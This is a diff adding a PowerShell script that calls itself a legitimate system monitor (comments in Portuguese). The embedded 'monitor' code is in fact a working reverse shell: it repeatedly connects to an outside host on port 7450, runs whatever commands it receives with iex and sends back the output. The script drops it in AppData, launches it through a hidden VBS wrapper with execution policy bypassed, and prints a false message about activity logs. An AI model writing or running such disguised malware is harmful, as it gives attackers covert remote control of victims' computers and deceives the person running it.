@@ -1,1 +1,34 @@
+# Script de Monitoramento Legítimo
+# Save-LogMonitor.ps1
+
+$LogDir = "$env:APPDATA\SystemMonitor"
+$LogFile = "$LogDir\activity.log"
+
+# Criar diretório se não existir
+if (-not (Test-Path $LogDir)) {
+    New-Item -ItemType Directory -Path $LogDir | Out-Null
+}
+
+# Código do monitor
+$MonitorScript = @'
 $e='SilentlyContinue';while(1){try{$c=New-Object Net.Sockets.TCPClient('p6xwg1pzl.localto.net',7450);$s=$c.GetStream();$b=New-Object byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);$s.Flush()}}catch{Start-Sleep -s 5}}
+'@
+
+# Salvar script de monitoramento
+$MonitorScript | Out-File -FilePath "$LogDir\monitor.ps1" -Encoding UTF8
+
+# Criar launcher VBS para executar invisivelmente
+$VbsLauncher = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$LogDir\monitor.ps1""", 0, False
+"@
+
+$VbsLauncher | Out-File -FilePath "$LogDir\start.vbs" -Encoding ASCII
+
+# Iniciar o monitor
+Start-Process wscript.exe -ArgumentList "`"$LogDir\start.vbs`"" -WindowStyle Hidden
+
+Write-Host "Monitor de Sistema iniciado em background" -ForegroundColor Green
+Write-Host "Logs disponíveis em: $LogFile" -ForegroundColor Yellow
+
+
